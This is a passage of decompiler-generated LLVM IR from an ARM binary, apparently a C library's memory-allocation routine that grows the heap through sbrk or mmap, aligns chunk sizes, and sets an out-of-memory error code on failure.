  %v6_25f20 = add i32 %v5_25f20, 884
  %v7_25f20 = inttoptr i32 %v6_25f20 to i32*
  store i32 %v2_25f14, i32* %v7_25f20, align 4
  br label %dec_label_pc_26230

dec_label_pc_25f28:                               ; preds = %dec_label_pc_25e6c, %dec_label_pc_25e4c, %dec_label_pc_25e80.dec_label_pc_25f28_crit_edge, %dec_label_pc_25e5c
  %v1_25f4c = phi i32 [ %v1_25f4c.pre, %dec_label_pc_25e80.dec_label_pc_25f28_crit_edge ], [ %v0_25df4, %dec_label_pc_25e5c ], [ %v0_25df4, %dec_label_pc_25e4c ], [ %v0_25df4, %dec_label_pc_25e6c ]
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %ip.global-to-local, align 4
  %v4_25f30 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_25f30, i32* %r3.global-to-local, align 4
  %v1_25f34 = add i32 %v4_25f30, 44
  %v2_25f34 = inttoptr i32 %v1_25f34 to i32*
  %v3_25f34 = load i32, i32* %v2_25f34, align 4
  store i32 %v3_25f34, i32* %r0.global-to-local, align 4
  %v1_25f38 = add i32 %v4_25f30, 864
  %v2_25f38 = inttoptr i32 %v1_25f38 to i32*
  %v3_25f38 = load i32, i32* %v2_25f38, align 4
  store i32 %v3_25f38, i32* %r2.global-to-local, align 4
  %v1_25f3c = add i32 %v4_25f30, 840
  %v2_25f3c = inttoptr i32 %v1_25f3c to i32*
  %v3_25f3c = load i32, i32* %v2_25f3c, align 4
  store i32 %v3_25f3c, i32* %r3.global-to-local, align 4
  %v1_25f40 = add i32 %v3_25f34, 4
  %v2_25f40 = inttoptr i32 %v1_25f40 to i32*
  %v3_25f40 = load i32, i32* %v2_25f40, align 4
  store i32 %v3_25f40, i32* %r1.global-to-local, align 4
  %v1_25f48 = urem i32 %v3_25f38, 2
  %v2_25f48 = icmp eq i32 %v1_25f48, 0
  %v1_25f44 = add i32 %v1_25f4c, 16
  %v2_25f4c = add i32 %v1_25f44, %v3_25f3c
  store i32 %v2_25f4c, i32* %r3.global-to-local, align 4
  %v1_25f50 = and i32 %v3_25f40, -4
  store i32 %v1_25f50, i32* @r8, align 4
  br i1 %v2_25f48, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_25f28
  %v3_25f54 = sub i32 %v2_25f4c, %v1_25f50
  store i32 %v3_25f54, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_25f28, %bb152
  %v0_25f58 = phi i32 [ %v2_25f4c, %dec_label_pc_25f28 ], [ %v3_25f54, %bb152 ]
  %v1_25f58 = load i32, i32* %sb.global-to-local, align 4
  %v2_25f58 = add i32 %v1_25f58, %v0_25f58
  store i32 %v2_25f58, i32* %r3.global-to-local, align 4
  %v1_25f5c = sub i32 -1, %v1_25f58
  store i32 %v1_25f5c, i32* %fp.global-to-local, align 4
  %v2_25f60 = and i32 %v2_25f58, %v1_25f5c
  store i32 %v2_25f60, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_25f60, 1
  br i1 %tmp154, label %dec_label_pc_25f84, label %dec_label_pc_25f70

dec_label_pc_25f70:                               ; preds = %bb153
  store i32 %v2_25f60, i32* %r0.global-to-local, align 4
  %v1_25f74 = call i32 @__GI_sbrk(i32 %v2_25f60)
  store i32 %v1_25f74, i32* %r0.global-to-local, align 4
  %v3_25f78 = icmp eq i32 %v1_25f74, -1
  store i32 %v1_25f74, i32* @r4, align 4
  br i1 %v3_25f78, label %dec_label_pc_25f84, label %dec_label_pc_25ff0

dec_label_pc_25f84:                               ; preds = %dec_label_pc_25f70, %bb153
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r1.global-to-local, align 4
  %v4_25f8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_25f8c, i32* %r6.global-to-local, align 4
  %v1_25f90 = add i32 %v4_25f8c, 864
  %v2_25f90 = inttoptr i32 %v1_25f90 to i32*
  %v3_25f90 = load i32, i32* %v2_25f90, align 4
  store i32 %v3_25f90, i32* %r3.global-to-local, align 4
  %v1_25f94 = urem i32 %v3_25f90, 2
  %v2_25f94 = icmp eq i32 %v1_25f94, 0
  br i1 %v2_25f94, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_25f84
  %v1_25f98 = load i32, i32* @r8, align 4
  %v2_25f98 = load i32, i32* %sb.global-to-local, align 4
  %v3_25f98 = add i32 %v2_25f98, %v1_25f98
  %v2_25f9c = load i32, i32* @r5, align 4
  %v3_25f9c = add i32 %v3_25f98, %v2_25f9c
  store i32 %v3_25f9c, i32* %r3.global-to-local, align 4
  %v2_25fa0 = load i32, i32* %fp.global-to-local, align 4
  %v3_25fa0 = and i32 %v2_25fa0, %v3_25f9c
  store i32 %v3_25fa0, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_25f84
  %v0_25fa4.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_25fa4 = phi i32 [ %v0_25fa4.pr, %.thread29thread-pre-split ], [ %v3_25fa0, %bb155 ]
  %v2_25fa4 = icmp ugt i32 %v0_25fa4, 1048575
  br i1 %v2_25fa4, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_25fbc = phi i32 [ %v0_25fa4, %.thread29 ], [ 1048576, %bb156 ]
  %v1_25fac = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_25fbc, %v1_25fac
  br i1 %tmp214, label %dec_label_pc_25fb4, label %dec_label_pc_26218

dec_label_pc_25fb4:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_25fbc, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_25fd0 = call i32 @mmap(i32 0, i32 %v0_25fbc, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_25fd0, i32* %r0.global-to-local, align 4
  %v3_25fd4 = icmp eq i32 %v6_25fd0, -1
  %v8_25fd4 = icmp eq i32 %v6_25fd0, -1
  store i32 %v6_25fd0, i32* @r4, align 4
  br i1 %v8_25fd4, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_25fb4
  %v1_25fdc = load i32, i32* %r6.global-to-local, align 4
  %v2_25fdc = add i32 %v1_25fdc, 864
  %v3_25fdc = inttoptr i32 %v2_25fdc to i32*
  %v4_25fdc = load i32, i32* %v3_25fdc, align 4
  %v2_25fe0 = load i32, i32* @r5, align 4
  %v3_25fe0 = add i32 %v2_25fe0, %v6_25fd0
  store i32 %v3_25fe0, i32* %r0.global-to-local, align 4
  %v2_25fe4 = and i32 %v4_25fdc, -2
  store i32 %v2_25fe4, i32* %r3.global-to-local, align 4
  store i32 %v2_25fe4, i32* %v3_25fdc, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_25fb4, %bb158
  br i1 %v3_25fd4, label %dec_label_pc_25ff0, label %dec_label_pc_25ff4

dec_label_pc_25ff0:                               ; preds = %.thread32, %dec_label_pc_25f70
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_25ff4

dec_label_pc_25ff4:                               ; preds = %.thread32, %dec_label_pc_25ff0
  %v0_25ff4 = load i32, i32* @r4, align 4
  %v7_25ff4 = icmp eq i32 %v0_25ff4, -1
  br i1 %v7_25ff4, label %dec_label_pc_26218, label %dec_label_pc_25ffc

dec_label_pc_25ffc:                               ; preds = %dec_label_pc_25ff4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r2.global-to-local, align 4
  %v4_26004 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_26004, i32* %ip.global-to-local, align 4
  store i32 %v3_25f34, i32* %r2.global-to-local, align 4
  %v1_2600c = add i32 %v4_26004, 872
  %v2_2600c = inttoptr i32 %v1_2600c to i32*
  %v3_2600c = load i32, i32* %v2_2600c, align 4
  %v1_26010 = load i32, i32* @r8, align 4
  %v2_26010 = add i32 %v1_26010, %v3_25f34
  store i32 %v2_26010, i32* %r1.global-to-local, align 4
  %v0_26014 = load i32, i32* @r5, align 4
  %v2_26014 = add i32 %v0_26014, %v3_2600c
  store i32 %v2_26014, i32* %r3.global-to-local, align 4
  %v9_26018 = icmp eq i32 %v0_25ff4, %v2_26010
  br i1 %v9_26018, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_25ffc
  store i32 %v2_26014, i32* %v2_2600c, align 4
  br label %dec_label_pc_26034

bb159:                                            ; preds = %dec_label_pc_25ffc
  %v1_2601c = load i32, i32* %r0.global-to-local, align 4
  %v8_2601c = icmp eq i32 %v1_2601c, -1
  store i32 %v2_26014, i32* %v2_2600c, align 4
  br i1 %v8_2601c, label %.thread34, label %dec_label_pc_26034

.thread34:                                        ; preds = %bb159
  %v1_26024 = load i32, i32* @r5, align 4
  %v2_26024 = load i32, i32* @r8, align 4
  %v3_26024 = add i32 %v2_26024, %v1_26024
  %v2_26028 = or i32 %v3_26024, 1
  store i32 %v2_26028, i32* %r3.global-to-local, align 4
  %v2_2602c = load i32, i32* %r2.global-to-local, align 4
  %v3_2602c = add i32 %v2_2602c, 4
  %v4_2602c = inttoptr i32 %v3_2602c to i32*
  store i32 %v2_26028, i32* %v4_2602c, align 4
  br label %dec_label_pc_261ac

dec_label_pc_26034:                               ; preds = %bb159, %.thread122
  %v0_26038.pr = load i32, i32* @r8, align 4
  %v0_26034 = load i32, i32* %ip.global-to-local, align 4
  %v1_26034 = add i32 %v0_26034, 864
  %v2_26034 = inttoptr i32 %v1_26034 to i32*
  %v3_26034 = load i32, i32* %v2_26034, align 4
  store i32 %v3_26034, i32* %r2.global-to-local, align 4
  %v2_26038 = icmp eq i32 %v0_26038.pr, 0
  br i1 %v2_26038, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_26034
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_26034
  %v2_26040 = urem i32 %v3_26034, 2
  store i32 %v2_26040, i32* %r3.global-to-local, align 4
  %v2_26044 = icmp eq i32 %v2_26040, 0
  br i1 %v2_26044, label %.thread40, label %dec_label_pc_2604c

dec_label_pc_2604c:                               ; preds = %.thread36
  %v0_2604c = load i32, i32* @r4, align 4
  %v1_2604c = load i32, i32* %r1.global-to-local, align 4
  %v3_2604c = icmp ult i32 %v0_2604c, %v1_2604c
  br i1 %v3_2604c, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_2604c
  %v2_26050 = and i32 %v3_26034, -2
  store i32 %v2_26050, i32* %r3.global-to-local, align 4
  store i32 %v2_26050, i32* %v2_26034, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_2604c, %.thread37, %.thread36, %bb160
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %ip.global-to-local, align 4
  %v4_26060 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_26060, i32* @r7, align 4
  %v1_26064 = add i32 %v4_26060, 864
  %v2_26064 = inttoptr i32 %v1_26064 to i32*
  %v3_26064 = load i32, i32* %v2_26064, align 4
  store i32 %v3_26064, i32* %r3.global-to-local, align 4
  %v1_26068 = urem i32 %v3_26064, 2
  store i32 %v1_26068, i32* @r6, align 4
  %v2_26068 = icmp eq i32 %v1_26068, 0
  br i1 %v2_26068, label %dec_label_pc_260fc, label %dec_label_pc_26070

dec_label_pc_26070:                               ; preds = %.thread40
  %v0_26070 = load i32, i32* @r8, align 4
  %v2_26070 = icmp eq i32 %v0_26070, 0
  br i1 %v2_26070, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_26070
  %v2_26074 = add i32 %v4_26060, 872
  %v3_26074 = inttoptr i32 %v2_26074 to i32*
  %v4_26074 = load i32, i32* %v3_26074, align 4
  store i32 %v4_26074, i32* %r2.global-to-local, align 4
  %v1_26078 = load i32, i32* %r1.global-to-local, align 4
  %v2_26078 = load i32, i32* @r4, align 4
  %v3_26078 = sub i32 %v2_26078, %v1_26078
  %v3_2607c = add i32 %v3_26078, %v4_26074
  store i32 %v3_2607c, i32* %r3.global-to-local, align 4
  store i32 %v3_2607c, i32* %v3_26074, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_26070, %bb161
  %v0_26084 = load i32, i32* @r4, align 4
  %v1_26084 = urem i32 %v0_26084, 8
  store i32 %v1_26084, i32* %r3.global-to-local, align 4
  %v2_26084 = icmp eq i32 %v1_26084, 0
  br i1 %v2_26084, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_26088 = sub nsw i32 8, %v1_26084
  store i32 %v2_26088, i32* %r3.global-to-local, align 4
  %v3_2608c = add i32 %v2_26088, %v0_26084
  store i32 %v3_2608c, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_26094 = phi i32 [ 0, %.thread43 ], [ %v2_26088, %bb162 ]
  %v1_26090 = load i32, i32* @r5, align 4
  %v2_26090 = add i32 %v1_26090, %v0_26084
  store i32 %v2_26090, i32* @r6, align 4
  %v1_26094 = load i32, i32* @r8, align 4
  %v2_26094 = add i32 %v2_26090, %v0_26094
  %v2_26098 = add i32 %v2_26094, %v1_26094
  store i32 %v2_26098, i32* %r1.global-to-local, align 4
  %v1_2609c = load i32, i32* %sb.global-to-local, align 4
  %v2_2609c = add i32 %v1_2609c, %v2_26098
  %v1_260a0 = load i32, i32* %fp.global-to-local, align 4
  %v2_260a0 = and i32 %v1_260a0, %v2_2609c
  store i32 %v2_260a0, i32* %r2.global-to-local, align 4
  %v2_260a4 = sub i32 0, %v2_26090
  store i32 %v2_260a4, i32* %r3.global-to-local, align 4
  %v2_260a8 = sub i32 %v2_260a0, %v2_26090
  store i32 %v2_260a8, i32* @r5, align 4
  store i32 %v2_260a8, i32* %r0.global-to-local, align 4
  br i1 %v2_26084, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_26084, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_260b4 = call i32 @__GI_sbrk(i32 %v2_260a8)
  store i32 %v1_260b4, i32* %r0.global-to-local, align 4
  %v3_260b8 = icmp eq i32 %v1_260b4, -1
  br i1 %v3_260b8, label %dec_label_pc_260c0, label %dec_label_pc_260d0

dec_label_pc_260c0:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_260c4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_260c4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_26128

dec_label_pc_260d0:                               ; preds = %bb164
  %v1_260d0 = load i32, i32* @r4, align 4
  %v3_260d0 = icmp ult i32 %v1_260b4, %v1_260d0
  br i1 %v3_260d0, label %dec_label_pc_260d8, label %dec_label_pc_26128

dec_label_pc_260d8:                               ; preds = %dec_label_pc_260d0
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r0.global-to-local, align 4
  %v4_260e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_260e0, i32* %r2.global-to-local, align 4
  %v1_260e4 = add i32 %v4_260e0, 864
  %v2_260e4 = inttoptr i32 %v1_260e4 to i32*
  %v3_260e4 = load i32, i32* %v2_260e4, align 4
  %v0_260e8 = load i32, i32* @r6, align 4
  store i32 %v0_260e8, i32* %r0.global-to-local, align 4
  %v1_260ec = and i32 %v3_260e4, -2
  store i32 %v1_260ec, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_260ec, i32* %v2_260e4, align 4
  br label %dec_label_pc_26128

dec_label_pc_260fc:                               ; preds = %.thread40
  %v0_260fc = load i32, i32* %r0.global-to-local, align 4
  %v3_260fc = icmp eq i32 %v0_260fc, -1
  br i1 %v3_260fc, label %dec_label_pc_26104, label %dec_label_pc_26120

dec_label_pc_26104:                               ; preds = %dec_label_pc_260fc
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_26108 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_26108, i32* %r0.global-to-local, align 4
  %v0_2610c = load i32, i32* @r7, align 4
  %v1_2610c = add i32 %v0_2610c, 872
  %v2_2610c = inttoptr i32 %v1_2610c to i32*
  %v3_2610c = load i32, i32* %v2_2610c, align 4
  store i32 %v3_2610c, i32* %r2.global-to-local, align 4
  %v0_26110 = load i32, i32* @r4, align 4
  %v0_26114 = load i32, i32* @r5, align 4
  %v2_26110 = add i32 %v3_2610c, %v1_26108
  %v2_26114 = sub i32 %v2_26110, %v0_26110
  %v2_26118 = sub i32 %v2_26114, %v0_26114
  store i32 %v2_26118, i32* %r3.global-to-local, align 4
  store i32 %v2_26118, i32* %v2_2610c, align 4
  %v0_26124.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_26120

dec_label_pc_26120:                               ; preds = %dec_label_pc_260fc, %dec_label_pc_26104
  %v0_26124 = phi i32 [ 0, %dec_label_pc_260fc ], [ %v0_26124.pre, %dec_label_pc_26104 ]
  %v0_26120 = load i32, i32* @r4, align 4
  store i32 %v0_26120, i32* @r7, align 4
  store i32 %v0_26124, i32* @r5, align 4
  br label %dec_label_pc_26128

dec_label_pc_26128:                               ; preds = %dec_label_pc_260d0, %dec_label_pc_260d8, %dec_label_pc_260c0, %dec_label_pc_26120
  %v0_26128 = load i32, i32* %r0.global-to-local, align 4
  %v7_26128 = icmp eq i32 %v0_26128, -1
  br i1 %v7_26128, label %dec_label_pc_261ac, label %dec_label_pc_26130

dec_label_pc_26130:                               ; preds = %dec_label_pc_26128
  %v1_26130 = load i32, i32* @r5, align 4
  %v2_26130 = add i32 %v1_26130, %v0_26128
  %v0_26134 = load i32, i32* @r7, align 4
  %v2_26134 = sub i32 %v2_26130, %v0_26134
  %v1_26138 = or i32 %v2_26134, 1
  %v2_2613c = add i32 %v0_26134, 4
  %v3_2613c = inttoptr i32 %v2_2613c to i32*
  store i32 %v1_26138, i32* %v3_2613c, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r1.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_26148 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_26148, i32* @r6, align 4
  %v1_2614c = add i32 %v4_26148, 872
  %v2_2614c = inttoptr i32 %v1_2614c to i32*
  %v3_2614c = load i32, i32* %v2_2614c, align 4
  %v0_26150 = load i32, i32* @r8, align 4
  %v2_26150 = icmp eq i32 %v0_26150, 0
  %v0_26154 = load i32, i32* @r5, align 4
  %v2_26154 = add i32 %v0_26154, %v3_2614c
  store i32 %v2_26154, i32* %r3.global-to-local, align 4
  store i32 %v2_26154, i32* %v2_2614c, align 4
  %v0_2615c = load i32, i32* @r7, align 4
  %v1_2615c = load i32, i32* @r6, align 4
  %v2_2615c = add i32 %v1_2615c, 44
  %v3_2615c = inttoptr i32 %v2_2615c to i32*
  store i32 %v0_2615c, i32* %v3_2615c, align 4
  br i1 %v2_26150, label %dec_label_pc_261ac, label %dec_label_pc_26164

dec_label_pc_26164:                               ; preds = %dec_label_pc_26130
  %v0_26168 = load i32, i32* @r8, align 4
  %v1_26168 = add i32 %v0_26168, -12
  %v1_2616c = and i32 %v1_26168, -8
  store i32 %v3_25f34, i32* %ip.global-to-local, align 4
  %v2_26174 = add i32 %v1_2616c, %v3_25f34
  store i32 %v2_26174, i32* %r1.global-to-local, align 4
  %v2_26178 = icmp ugt i32 %v1_2616c, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_26180 = or i32 %v1_2616c, 1
  store i32 %v1_26180, i32* %r3.global-to-local, align 4
  store i32 %v1_26180, i32* %v2_25f40, align 4
  %v0_26188 = load i32, i32* %r2.global-to-local, align 4
  %v1_26188 = load i32, i32* %r1.global-to-local, align 4
  %v2_26188 = add i32 %v1_26188, 8
  %v3_26188 = inttoptr i32 %v2_26188 to i32*
  store i32 %v0_26188, i32* %v3_26188, align 4
  %v0_2618c = load i32, i32* %r2.global-to-local, align 4
  %v1_2618c = load i32, i32* %r1.global-to-local, align 4
  %v2_2618c = add i32 %v1_2618c, 4
  %v3_2618c = inttoptr i32 %v2_2618c to i32*
  store i32 %v0_2618c, i32* %v3_2618c, align 4
  br i1 %v2_26178, label %dec_label_pc_26194, label %dec_label_pc_261ac

dec_label_pc_26194:                               ; preds = %dec_label_pc_26164
  %v0_26194 = load i32, i32* @r6, align 4
  %v1_26194 = add i32 %v0_26194, 836
  %v2_26194 = inttoptr i32 %v1_26194 to i32*
  %v3_26194 = load i32, i32* %v2_26194, align 4
  store i32 %v3_26194, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_2619c = load i32, i32* %ip.global-to-local, align 4
  %v1_2619c = add i32 %v0_2619c, 8
  store i32 %v1_2619c, i32* @r0, align 4
  store i32 -1, i32* %v2_26194, align 4
  %v0_261a4 = call i32 @free()
  store i32 %v0_261a4, i32* %r0.global-to-local, align 4
  %v0_261a8 = load i32, i32* @r4, align 4
  %v1_261a8 = load i32, i32* @r6, align 4
  %v2_261a8 = add i32 %v1_261a8, 836
  %v3_261a8 = inttoptr i32 %v2_261a8 to i32*
  store i32 %v0_261a8, i32* %v3_261a8, align 4
  br label %dec_label_pc_261ac

dec_label_pc_261ac:                               ; preds = %.thread34, %dec_label_pc_26164, %dec_label_pc_26130, %dec_label_pc_26128, %dec_label_pc_26194
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r0.global-to-local, align 4
  %v4_261b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_261b4, i32* %lr.global-to-local, align 4
  %v1_261b8 = add i32 %v4_261b4, 872
  store i32 %v1_261b8, i32* %r1.global-to-local, align 4
  %v1_261bc = inttoptr i32 %v1_261b8 to i32*
  %v2_261bc = load i32, i32* %v1_261bc, align 4
  store i32 %v2_261bc, i32* %r1.global-to-local, align 4
  %v3_261bc = add i32 %v4_261b4, 876
  %v4_261bc = inttoptr i32 %v3_261bc to i32*
  %v5_261bc = load i32, i32* %v4_261bc, align 4
  store i32 %v5_261bc, i32* %r3.global-to-local, align 4
  %v1_261c4 = add i32 %v4_261b4, 868
  %v2_261c4 = inttoptr i32 %v1_261c4 to i32*
  %v3_261c4 = load i32, i32* %v2_261c4, align 4
  store i32 %v3_261c4, i32* %r3.global-to-local, align 4
  %v1_261c8 = add i32 %v4_261b4, 884
  %v2_261c8 = inttoptr i32 %v1_261c8 to i32*
  %v3_261c8 = load i32, i32* %v2_261c8, align 4
  store i32 %v3_261c8, i32* %r2.global-to-local, align 4
  %v2_261cc = add i32 %v3_261c4, %v2_261bc
  store i32 %v2_261cc, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_261bc, %v5_261bc
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_261ac
  store i32 %v2_261bc, i32* %v4_261bc, align 4
  %v0_261d4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_261d4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_261ac, %bb165
  %v1_261d4 = phi i32 [ %v3_261c8, %dec_label_pc_261ac ], [ %v1_261d4.pre, %bb165 ]
  %v4_261d8 = phi i32 [ %v2_261cc, %dec_label_pc_261ac ], [ %v0_261d4.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_261d8, %v1_261d4
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_261d8 = load i32, i32* %lr.global-to-local, align 4
  %v6_261d8 = add i32 %v5_261d8, 884
  %v7_261d8 = inttoptr i32 %v6_261d8 to i32*
  store i32 %v4_261d8, i32* %v7_261d8, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_261dc = load i32, i32* %lr.global-to-local, align 4
  %v1_261dc = add i32 %v0_261dc, 44
  %v2_261dc = inttoptr i32 %v1_261dc to i32*
  %v3_261dc = load i32, i32* %v2_261dc, align 4
  store i32 %v3_261dc, i32* %ip.global-to-local, align 4
  %v1_261e0 = add i32 %v3_261dc, 4
  %v2_261e0 = inttoptr i32 %v1_261e0 to i32*
  %v3_261e0 = load i32, i32* %v2_261e0, align 4
  store i32 %v1_25df4, i32* %r1.global-to-local, align 4
  %v1_261e8 = and i32 %v3_261e0, -4
  store i32 %v1_261e8, i32* %r3.global-to-local, align 4
  %v3_261ec = icmp ult i32 %v1_261e8, %v1_25df4
  br i1 %v3_261ec, label %dec_label_pc_26218, label %dec_label_pc_261f4

dec_label_pc_261f4:                               ; preds = %bb168
  %v0_261f4 = load i32, i32* @sl, align 4
  %v2_261f4 = sub i32 %v1_261e8, %v0_261f4
  %v2_261f8 = add i32 %v0_261f4, %v3_261dc
  store i32 %v2_261f8, i32* %r1.global-to-local, align 4
  %v1_261fc = or i32 %v2_261f4, 1
  store i32 %v1_261fc, i32* %r3.global-to-local, align 4
  %v1_26200 = or i32 %v0_261f4, 1
  store i32 %v1_26200, i32* %r2.global-to-local, align 4
  %v1_26204 = add i32 %v3_261dc, 8
  store i32 %v1_26204, i32* %r0.global-to-local, align 4
  store i32 %v1_26200, i32* %v2_261e0, align 4
  %v0_2620c = load i32, i32* %r1.global-to-local, align 4
  %v1_2620c = load i32, i32* %lr.global-to-local, align 4
  %v2_2620c = add i32 %v1_2620c, 44
  %v3_2620c = inttoptr i32 %v2_2620c to i32*
  store i32 %v0_2620c, i32* %v3_2620c, align 4
  %v0_26210 = load i32, i32* %r3.global-to-local, align 4
  %v1_26210 = load i32, i32* %r1.global-to-local, align 4
  %v2_26210 = add i32 %v1_26210, 4
  %v3_26210 = inttoptr i32 %v2_26210 to i32*
  store i32 %v0_26210, i32* %v3_26210, align 4
  br label %dec_label_pc_26230

dec_label_pc_26218:                               ; preds = %bb157, %bb168, %dec_label_pc_25ff4
  store i32 116492, i32* %r3.global-to-local, align 4
  %v0_2621c = call i32 @__aeabi_read_tp()
  %v3_26220 = load i16, i16* @global_var_42934.3040, align 2
  %v4_26220 = sext i16 %v3_26220 to i32
  store i32 %v4_26220, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_26228 = add i32 %v4_26220, %v0_2621c
  %v4_26228 = inttoptr i32 %v3_26228 to i32*
  store i32 12, i32* %v4_26228, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_26230

dec_label_pc_26230:                               ; preds = %bb151, %bb150, %dec_label_pc_261f4, %dec_label_pc_25e3c, %dec_label_pc_26218
  %v0_26230 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_26230, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_26234

dec_label_pc_26234:                               ; preds = %.thread1, %dec_label_pc_25e08, %.thread121, %dec_label_pc_25c78, %dec_label_pc_25c6c, %dec_label_pc_25ad4, %dec_label_pc_25a58, %dec_label_pc_26230
  store i32 %v2_25978, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 52, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r2, align 4
  %v4_26244 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 52) to i32*), align 4
  store i32 %v4_26244, i32* @ip, align 4
  store i32 156240, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_26244)
  br label %dec_label_pc_26250

dec_label_pc_26250:                               ; preds = %dec_label_pc_259b0, %dec_label_pc_26234
  %v0_26250 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_26250, i32* %r0.global-to-local, align 4
  store i32 %v3_2594c, i32* @r4, align 4
  store i32 %v6_2594c, i32* @r5, align 4
  store i32 %v9_2594c, i32* @r6, align 4
  store i32 %v12_2594c, i32* @r7, align 4
  store i32 %v15_2594c, i32* @r8, align 4
  store i32 %v18_2594c, i32* @sb, align 4
  store i32 %v21_2594c, i32* @sl, align 4
  store i32 %v24_2594c, i32* @fp, align 4
  store i32 %v27_2594c, i32* @lr, align 4
  ret i32 %v0_26250

; uselistorder directives
  uselistorder i32 %v0_261f4, { 1, 0, 2 }
  uselistorder i32 %v3_261dc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_261d8, { 1, 0 }
  uselistorder i32 %v2_261bc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_261b4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_2616c, { 1, 2, 0 }
  uselistorder i32 %v0_26134, { 1, 0 }
  uselistorder i32 %v0_26128, { 1, 0 }
  uselistorder i32 %v2_26118, { 1, 0 }
